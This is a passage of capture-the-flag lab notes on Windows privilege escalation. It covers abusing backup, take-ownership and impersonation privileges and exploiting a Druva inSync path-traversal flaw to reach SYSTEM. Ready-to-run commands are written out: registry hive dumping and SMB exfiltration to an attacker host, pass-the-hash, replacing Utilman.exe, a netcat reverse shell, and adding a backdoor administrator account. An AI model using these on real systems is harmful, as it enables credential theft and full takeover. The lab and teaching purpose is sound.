    - Account: `THMBackup` (member of _Backup Operators_)
    - **Steps**:
        1. Run **Command Prompt as Admin** (required to enable the privilege).
        2. Dump registry hives:
            
            cmd
            
            1 `reg save hklm\sam C:\Users\THMBackup\sam.hive`
            
            2 `reg save hklm\system C:\Users\THMBackup\system.hive`
            
            
        3. Exfiltrate hives to Kali via SMB (`copy \\KALI_IP\public\`).
        4. Extract hashes with Impacket:
            
            bash
            
            1 `secretsdump.py -sam sam.hive -system system.hive LOCAL`
            
        1. **Pass-the-Hash** to get SYSTEM:
            
            bash
            
            1 `psexec.py -hashes :<NTLM_HASH> administrator@TARGET_IP`
            

---

## 🔹 2. **SeTakeOwnershipPrivilege**

- **What it does**: Take ownership of **any file, folder, or registry key**.
- **Abuse**:
    - Account: `THMTakeOwnership`
    - **Steps**:
        1. Run **Command Prompt as Admin**.
        2. Take ownership of `Utilman.exe` (Ease of Access utility, runs as SYSTEM):
            
            cmd
            
            1 `takeown /f C:\Windows\System32\Utilman.exe`
            
            2 `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`

        3. Replace it with `cmd.exe`:
            
            cmd
            
            1 `copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe`
            
        4. **Lock screen** → Click **Ease of Access** → Get **SYSTEM shell**.

---

## 🔹 3. **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege**

- **What it does**: Impersonate other users (e.g., SYSTEM) after they authenticate to a service you control.
- **Abuse**:
    - Common in service accounts (`IIS AppPool`, `NETWORK SERVICE`).
    - **RogueWinRM Exploit**:
        1. Start **netcat listener** on Kali:
            
            bash
            
            1 `nc -lvp 4442`
            
        1. On target, run **RogueWinRM** to hijack BITS service (connects to WinRM as SYSTEM):
            
            cmd
            
            1 `C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe KALI_IP 4442"`
            
        2. Wait ~2 mins → Get **reverse SYSTEM shell**.

---

## ✅ Final Goal: Get the Flag

Once you have **SYSTEM access** (via any method):

1. Navigate to Administrator’s desktop:
    
    cmd
    
    1 `cd C:\Users\Administrator\Desktop`
    
1. Find and read `flag.txt`:
    
    cmd
    
    1 `dir flag.txt /s /b ← Correct Windows syntax`
    
    2 `type flag.txt`
    
    
> ⚠️ **Remember**:
> 
> - Use **Windows commands** (`dir`, `type`) — not Linux (`find`, `cat`).
> - Always use the **correct hash from your dump** (not example hashes).
> - Format PtH as `-hashes :NTHASH` (with colon!).

---

### 🏁 You now have 3 reliable paths to **SYSTEM** — choose one, get the flag! 🚩

# Abusing Vulnerable Software

### 🔍 **Privilege Escalation via Unpatched Software – Summary**

#### 🎯 **Goal**:

Exploit a known vulnerability in **Druva inSync 6.6.3** to escalate from a low-privilege user (`thm-unpriv`) to **Administrator/SYSTEM** and retrieve the flag.

---

### 🔹 Key Concepts

- **Unpatched software** is a common privilege escalation vector.
- Use `wmic product get name,version,vendor` to list installed software (though it may miss some apps).
- Always cross-check with **Exploit-DB**, **Packet Storm**, or **Google** for known vulnerabilities.

---

### 🔹 Vulnerability: **Druva inSync 6.6.3**

- Runs an **RPC server on port 6064** as **SYSTEM** (localhost-only).
- **Procedure #5** allows **arbitrary command execution**.
- A flawed patch tried to restrict commands to `C:\ProgramData\Druva\inSync4\...`, but it’s bypassed via **path traversal**:
    
    1 `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`
    
---

### 🔧 Exploitation Steps

1. **Log in** as `thm-unpriv` / `Password321`.
2. **Open PowerShell** and run the exploit (or use the pre-saved file at `C:\tools\Druva_inSync_exploit.txt`).
3. **Modify the payload** to:
    
    powershell
    
    1 `$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"`
    
1. **Execute the exploit** → creates admin user `pwnd`.
2. **Verify**:
    
    cmd
    
    1 `net user pwnd`

    
    → Should show membership in **Administrators** group.
3. **Log in as `pwnd`** (via "Run as different user" or new RDP session).
4. **Retrieve the flag**:
    
    cmd
    
    1 `type C:\Users\Administrator\Desktop\flag.txt`
    

---

### ✅ Why It Works

- The RPC service runs as **SYSTEM**.
- Path traversal bypasses the patch.
- No authentication required (local access is enough).

---

### 🛡️ Mitigation

- **Patch software regularly** — not just the OS.
- Avoid running services as **SYSTEM** unless absolutely necessary.
- Apply **least privilege** and **input validation** (e.g., block `..` in paths).

---

### 🏁 Final Tip

You don’t need to crack passwords — just **abuse the vulnerable service** to create your own admin account and grab the flag! 🚩